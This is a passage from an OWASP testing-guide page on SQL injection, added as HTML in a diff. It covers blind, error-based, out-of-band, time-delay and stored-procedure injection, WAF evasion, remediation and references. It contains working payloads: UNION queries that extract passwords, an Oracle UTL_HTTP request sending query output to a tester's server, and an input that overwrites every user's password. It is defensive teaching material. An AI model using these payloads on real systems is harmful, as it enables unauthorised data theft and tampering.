+<p><code class="language-plaintext highlighter-rouge">SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1'</code></p>
+
+<p>The query returns either true or false. If we obtain true, then we have completed the inference and, therefore, we know the value of the parameter. If we obtain false, this means that the null character is present in the value of the parameter, and we must continue to analyze the next parameter until we find another null value.</p>
+
+<p>The blind SQL injection attack needs a high volume of queries. The tester may need an automatic tool to exploit the vulnerability.</p>
+
+<h4 id="error-based-exploitation-technique">Error Based Exploitation Technique</h4>
+
+<p>An Error based exploitation technique is useful when the tester for some reason can’t exploit the SQL injection vulnerability using other technique such as UNION. The Error based technique consists in forcing the database to perform some operation in which the result will be an error. The point here is to try to extract some data from the database and show it in the error message. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).</p>
+
+<p>Consider the following SQL query:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SELECT * FROM products WHERE id_product=$id_product</code></p>
+
+<p>Consider also the request to a script who executes the query above:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10</code></p>
+
+<p>The malicious request would be (e.g. Oracle 10g):</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--</code></p>
+
+<p>In this example, the tester is concatenating the value 10 with the result of the function <code class="language-plaintext highlighter-rouge">UTL_INADDR.GET_HOST_NAME</code>. This Oracle function will try to return the hostname of the parameter passed to it, which is other query, the name of the user. When the database looks for a hostname with the user database name, it will fail and return an error message like:</p>
+
+<p><code class="language-plaintext highlighter-rouge">ORA-292257: host SCOTT unknown</code></p>
+
+<p>Then the tester can manipulate the parameter passed to GET_HOST_NAME() function and the result will be shown in the error message.</p>
+
+<h4 id="out-of-band-exploitation-technique">Out of Band Exploitation Technique</h4>
+
+<p>This technique is very useful when the tester find a <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection">Blind SQL Injection</a> situation, in which nothing is known on the outcome of an operation. The technique consists of the use of DBMS functions to perform an out of band connection and deliver the results of the injected query as part of the request to the tester’s server. Like the error based techniques, each DBMS has its own functions. Check for specific DBMS section.</p>
+
+<p>Consider the following SQL query:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SELECT * FROM products WHERE id_product=$id_product</code></p>
+
+<p>Consider also the request to a script who executes the query above:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10</code></p>
+
+<p>The malicious request would be:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--</code></p>
+
+<p>In this example, the tester is concatenating the value 10 with the result of the function <code class="language-plaintext highlighter-rouge">UTL_HTTP.request</code>. This Oracle function will try to connect to <code class="language-plaintext highlighter-rouge">testerserver</code> and make a HTTP GET request containing the return from the query <code class="language-plaintext highlighter-rouge">SELECT user FROM DUAL</code>. The tester can set up a webserver (e.g. Apache) or use the Netcat tool:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/tester/nc –nLp 80
+
+GET /SCOTT HTTP/1.1
+Host: testerserver.com
+Connection: close
+</code></pre></div></div>
+
+<h4 id="time-delay-exploitation-technique">Time Delay Exploitation Technique</h4>
+
+<p>The time delay exploitation technique is very useful when the tester find a <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection">Blind SQL Injection</a> situation, in which nothing is known on the outcome of an operation. This technique consists in sending an injected query and in case the conditional is true, the tester can monitor the time taken to for the server to respond. If there is a delay, the tester can assume the result of the conditional query is true. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).</p>
+
+<p>Consider the following SQL query:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SELECT * FROM products WHERE id_product=$id_product</code></p>
+
+<p>Consider also the request to a script who executes the query above:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10</code></p>
+
+<p>The malicious request would be (e.g. MySql 5.x):</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--</code></p>
+
+<p>In this example the tester is checking whether the MySql version is 5.x or not, making the server to delay the answer by 10 seconds. The tester can increase the delay time and monitor the responses. The tester also doesn’t need to wait for the response. Sometimes he can set a very high value (e.g. 100) and cancel the request after some seconds.</p>
+
+<h4 id="stored-procedure-injection">Stored Procedure Injection</h4>
+
+<p>When using dynamic SQL within a stored procedure, the application must properly sanitize the user input to eliminate the risk of code injection. If not sanitized, the user could enter malicious SQL that will be executed within the stored procedure.</p>
+
+<p>Consider the following SQL Server Stored Procedure:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Create</span> <span class="k">procedure</span> <span class="n">user_login</span> <span class="o">@</span><span class="n">username</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span> <span class="o">@</span><span class="n">passwd</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
+<span class="k">As</span>
+<span class="k">Declare</span> <span class="o">@</span><span class="n">sqlstring</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">250</span><span class="p">)</span>
+<span class="k">Set</span> <span class="o">@</span><span class="n">sqlstring</span>  <span class="o">=</span> <span class="err">‘</span>
+<span class="k">Select</span> <span class="mi">1</span> <span class="k">from</span> <span class="n">users</span>
+<span class="k">Where</span> <span class="n">username</span> <span class="o">=</span> <span class="err">‘</span> <span class="o">+</span> <span class="o">@</span><span class="n">username</span> <span class="o">+</span> <span class="err">‘</span> <span class="k">and</span> <span class="n">passwd</span> <span class="o">=</span> <span class="err">‘</span> <span class="o">+</span> <span class="o">@</span><span class="n">passwd</span>
+<span class="k">exec</span><span class="p">(</span><span class="o">@</span><span class="n">sqlstring</span><span class="p">)</span>
+<span class="k">Go</span>
+</code></pre></div></div>
+
+<p>User input:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">anyusername</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="s1">'
+anypassword
+</span></code></pre></div></div>
+
+<p>This procedure does not sanitize the input, therefore allowing the return value to show an existing record with these parameters.</p>
+
+<blockquote>
+  <p>This example may seem unlikely due to the use of dynamic SQL to log in a user, but consider a dynamic reporting query where the user selects the columns to view. The user could insert malicious code into this scenario and compromise the data.</p>
+</blockquote>
+
+<p>Consider the following SQL Server Stored Procedure:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Create</span>
+<span class="k">procedure</span> <span class="n">get_report</span> <span class="o">@</span><span class="n">columnamelist</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">7900</span><span class="p">)</span>
+<span class="k">As</span>
+<span class="k">Declare</span> <span class="o">@</span><span class="n">sqlstring</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">8000</span><span class="p">)</span>
+<span class="k">Set</span> <span class="o">@</span><span class="n">sqlstring</span>  <span class="o">=</span> <span class="err">‘</span>
+<span class="k">Select</span> <span class="err">‘</span> <span class="o">+</span> <span class="o">@</span><span class="n">columnamelist</span> <span class="o">+</span> <span class="err">‘</span> <span class="k">from</span> <span class="n">ReportTable</span><span class="err">‘</span>
+<span class="k">exec</span><span class="p">(</span><span class="o">@</span><span class="n">sqlstring</span><span class="p">)</span>
+<span class="k">Go</span>
+</code></pre></div></div>
+
+<p>User input:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span> <span class="k">update</span> <span class="n">users</span> <span class="k">set</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">'password'</span><span class="p">;</span> <span class="k">select</span> <span class="o">*</span>
+</code></pre></div></div>
+
+<p>This will result in the report running and all users’ passwords being updated.</p>
+
+<h4 id="automated-exploitation">Automated Exploitation</h4>
+
+<p>Most of the situation and techniques presented here can be performed in a automated way using some tools. In this article the tester can find information how to perform an automated auditing using <a href="https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap">SQLMap</a></p>
+
+<h3 id="sql-injection-signature-evasion-techniques">SQL Injection Signature Evasion Techniques</h3>
+
+<p>The techniques are used to bypass defenses such as Web application firewalls (WAFs) or intrusion prevention systems (IPSs). Also refer to <a href="https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF">https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF</a></p>
+
+<h4 id="whitespace">Whitespace</h4>
+
+<p>Dropping space or adding spaces that won’t affect the SQL statement. For example</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">or</span> <span class="s1">'a'</span><span class="o">=</span><span class="s1">'a'</span>
+
+<span class="k">or</span> <span class="s1">'a'</span>  <span class="o">=</span>    <span class="s1">'a'</span>
+</code></pre></div></div>
+
+<p>Adding special character like new line or tab that won’t change the SQL statement execution. For example,</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">or</span>
+<span class="s1">'a'</span><span class="o">=</span>
+        <span class="s1">'a'</span>
+</code></pre></div></div>
+
+<h4 id="null-bytes">Null Bytes</h4>
+
+<p>Use null byte (%00) prior to any characters that the filter is blocking.</p>
+
+<p>For example, if the attacker may inject the following SQL</p>
+
+<p><code class="language-plaintext highlighter-rouge">' UNION SELECT password FROM Users WHERE username='admin'--</code></p>
+
+<p>to add Null Bytes will be</p>
+
+<p><code class="language-plaintext highlighter-rouge">%00' UNION SELECT password FROM Users WHERE username='admin'--</code></p>
+
+<h4 id="sql-comments">SQL Comments</h4>
+
+<p>Adding SQL inline comments can also help the SQL statement to be valid and bypass the SQL injection filter. Take this SQL injection as example.</p>
+
+<p><code class="language-plaintext highlighter-rouge">' UNION SELECT password FROM Users WHERE name='admin'--</code></p>
+
+<p>Adding SQL inline comments will be.</p>
+
+<p><code class="language-plaintext highlighter-rouge">'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--</code></p>
+
+<h4 id="url-encoding">URL Encoding</h4>
+
+<p>Use the <a href="https://meyerweb.com/eric/tools/dencoder/">online URL encoding</a> to encode the SQL statement</p>
+
+<p><code class="language-plaintext highlighter-rouge">' UNION SELECT password FROM Users WHERE name='admin'--</code></p>
+
+<p>The URL encoding of the SQL injection statement will be</p>
+
+<p><code class="language-plaintext highlighter-rouge">%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--</code></p>
+
+<h4 id="character-encoding">Character Encoding</h4>
+
+<p>Char() function can be used to replace English char. For example, char(114,111,111,116) means root</p>
+
+<p><code class="language-plaintext highlighter-rouge">' UNION SELECT password FROM Users WHERE name='root'--</code></p>
+
+<p>To apply the Char(), the SQL injeciton statement will be</p>
+
+<p><code class="language-plaintext highlighter-rouge">' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--</code></p>
+
+<h4 id="string-concatenation">String Concatenation</h4>
+
+<p>Concatenation breaks up SQL keywords and evades filters. Concatenation syntax varies based on database engine. Take MS SQL engine as an example</p>
+
+<p><code class="language-plaintext highlighter-rouge">select 1</code></p>
+
+<p>The simple SQL statement can be changed as below by using concatenation</p>
+
+<p><code class="language-plaintext highlighter-rouge">EXEC('SEL' + 'ECT 1')</code></p>
+
+<h4 id="hex-encoding">Hex Encoding</h4>
+
+<p>Hex encoding technique uses Hexadecimal encoding to replace original SQL statement char. For example, <code class="language-plaintext highlighter-rouge">root</code> can be represented as <code class="language-plaintext highlighter-rouge">726F6F74</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">Select user from users where name = 'root'</code></p>
+
+<p>The SQL statement by using HEX value will be:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Select user from users where name = 726F6F74</code></p>
+
+<p>or</p>
+
+<p><code class="language-plaintext highlighter-rouge">Select user from users where name = unhex('726F6F74')</code></p>
+
+<h4 id="declare-variables">Declare Variables</h4>
+
+<p>Declare the SQL injection statement into variable and execute it.</p>
+
+<p>For example, SQL injection statement below</p>
+
+<p><code class="language-plaintext highlighter-rouge">Union Select password</code></p>
+
+<p>Define the SQL statement into variable <code class="language-plaintext highlighter-rouge">SQLivar</code></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span> <span class="k">declare</span> <span class="o">@</span><span class="n">SQLivar</span> <span class="n">nvarchar</span><span class="p">(</span><span class="mi">80</span><span class="p">);</span> <span class="k">set</span> <span class="o">@</span><span class="n">myvar</span> <span class="o">=</span> <span class="n">N</span><span class="s1">'UNI'</span> <span class="o">+</span> <span class="n">N</span><span class="s1">'ON'</span> <span class="o">+</span> <span class="n">N</span><span class="s1">' SELECT'</span> <span class="o">+</span> <span class="n">N</span><span class="s1">'password'</span><span class="p">);</span>
+<span class="k">EXEC</span><span class="p">(</span><span class="o">@</span><span class="n">SQLivar</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h4 id="alternative-expression-of-or-1--1">Alternative Expression of ‘or 1 = 1’</h4>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">OR</span> <span class="s1">'SQLi'</span> <span class="o">=</span> <span class="s1">'SQL'</span><span class="o">+</span><span class="s1">'i'</span>
+<span class="k">OR</span> <span class="s1">'SQLi'</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="s1">'S'</span>
+<span class="k">or</span> <span class="mi">20</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">1</span>
+<span class="k">OR</span> <span class="mi">2</span> <span class="k">between</span> <span class="mi">3</span> <span class="k">and</span> <span class="mi">1</span>
+<span class="k">OR</span> <span class="s1">'SQLi'</span> <span class="o">=</span> <span class="n">N</span><span class="s1">'SQLi'</span>
+<span class="mi">1</span> <span class="k">and</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="mi">1</span> <span class="o">||</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">1</span>
+</code></pre></div></div>
+
+<h2 id="remediation">Remediation</h2>
+
+<ul>
+  <li>To secure the application from SQL injection vulnerabilities, refer to the <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">SQL Injection Prevention CheatSheet</a>.</li>
+  <li>To secure the SQL server, refer to the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html">Database Security CheatSheet</a>.</li>
+</ul>
+
+<p>For generic input validation security, refer to the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html">Input Validation CheatSheet</a>.</p>
+
+<h2 id="tools">Tools</h2>
+
+<ul>
+  <li><a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection">SQL Injection Fuzz Strings (from wfuzz tool) - Fuzzdb</a></li>
+  <li><a href="http://packetstormsecurity.org/files/43795/sqlbftools-1.2.tar.gz.html">sqlbftools</a></li>
+  <li><a href="http://sqlmap.org/">Bernardo Damele A. G.: sqlmap, automatic SQL injection tool</a></li>
+  <li><a href="https://github.com/dtrip/mysqloit">Muhaimin Dzulfakar: MySqloit, MySql Injection takeover tool</a></li>
+</ul>
+
+<h2 id="references">References</h2>
+
+<ul>
+  <li><a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017-A1-Injection</a></li>
+  <li><a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL Injection</a></li>
+</ul>
+
+<p>Technology specific Testing Guide pages have been created for the following DBMSs:</p>
+
+<ul>
+  <li><a href="../05.1-Testing_for_Oracle/">Oracle</a></li>
+  <li><a href="../05.2-Testing_for_MySQL/">MySQL</a></li>
+  <li><a href="../05.3-Testing_for_SQL_Server/">SQL Server</a></li>
+  <li><a href="../05.4-Testing_PostgreSQL/">PostgreSQL</a></li>
+  <li><a href="../05.5-Testing_for_MS_Access/">MS Access</a></li>
+  <li><a href="../05.6-Testing_for_NoSQL_Injection/">NoSQL</a></li>
+  <li><a href="../05.7-Testing_for_ORM_Injection/">ORM</a></li>
+  <li><a href="../05.8-Testing_for_Client-side/">Client-side</a></li>
+</ul>
+
+<h3 id="whitepapers">Whitepapers</h3>
+
+<ul>
+  <li><a href="http://cs.unh.edu/~it666/reading_list/Web/advanced_sql_injection.pdf">Victor Chapela: “Advanced SQL Injection”</a></li>
+  <li><a href="https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf">Chris Anley: “More Advanced SQL Injection”</a></li>
+  <li><a href="https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf">David Litchfield: “Data-mining with SQL Injection and Inference”</a></li>
+  <li><a href="https://www.imperva.com/lg/lgw.asp?pid=369">Imperva: “Blinded SQL Injection”</a></li>
+  <li><a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/">Ferruh Mavituna: “SQL Injection Cheat Sheet”</a></li>
+  <li><a href="https://docs.google.com/file/d/0B5CQOTY4YRQCSWRHNkNaaFMyQTA/edit">Kevin Spett from SPI Dynamics: “SQL Injection”</a></li>
+  <li><a href="https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Blind_SQLInjection.pdf">Kevin Spett from SPI Dynamics: “Blind SQL Injection”</a></li>
+  <li><a href="https://www.exploit-db.com/papers/17934/">“ZeQ3uL” (Prathan Phongthiproek) and “Suphot Boonchamnan”: “Beyond SQLi: Obfuscate and Bypass”</a></li>
+  <li><a href="http://blog.checkpoint.com/2015/05/07/latest-sql-injection-trends/">Adi Kaploun and Eliran Goshen, Check Point Threat Intelligence &amp; Research Team: “The Latest SQL Injection Trends”</a></li>
+</ul>
+
+<h3 id="documentation-on-sql-injection-vulnerabilities-in-products">Documentation on SQL Injection Vulnerabilities in Products</h3>
+
+<ul>
+  <li><a href="https://www.vanstechelman.eu/content/anatomy-of-the-sql-injection-in-drupals-database-comment-filtering-system-sa-core-2015-003">Anatomy of the SQL injection in Drupal’s database comment filtering system SA-CORE-2015-003</a></li>
+</ul>
+
+      </article>
+    </div>
+  </div>
+</main>
+<script src="/assets/js/doc-nav.js" defer></script>
+
+  <footer id="page-end" class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-standalone">
+      <a href="https://owasp.org/" class="footer-logo ext-link" rel="noopener noreferrer" aria-label="OWASP Foundation (external)">
+        <img src="/assets/images/owasp-logo-footer.svg" alt="OWASP Foundation" width="213" height="64" loading="lazy">
+      </a>
+      <p class="footer-tagline">An OWASP Foundation project. <a href="https://owasp.org/" class="ext-link" rel="noopener noreferrer">About OWASP</a></p>
+      <div class="footer-buttons">
+        <a href="https://github.com/OWASP/wstg" class="btn btn-primary btn-github btn-github--footer ext-link" rel="noopener noreferrer" target="_blank" aria-label="View on GitHub (opens in new window)">
+          <svg class="icon-github" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" width="16" height="16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 2.97-1.86 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+          View on GitHub
+        </a>
+      </div>
+      <p class="footer-back-to-top"><a href="#top" class="footer-back-to-top-link">Back to top</a></p>
+    </div>
+    <div class="footer-bottom">
+      <p class="footer-legal">OWASP, the OWASP logo, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, OWASP Boston Application Security Conference, and LASCON are trademarks of the OWASP Foundation, Inc.</p>
+      <p class="footer-copy">&copy; 2026, OWASP Foundation Inc. All rights reserved.</p>
+    </div>
+  </div>
+</footer>
+
+<a href="#top" id="back-to-top" class="back-to-top" aria-label="Back to top" title="Back to top">
+  <svg class="back-to-top-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+</a>
+
+  <script src="/assets/js/theme.js" defer></script>
+</body>
+</html>
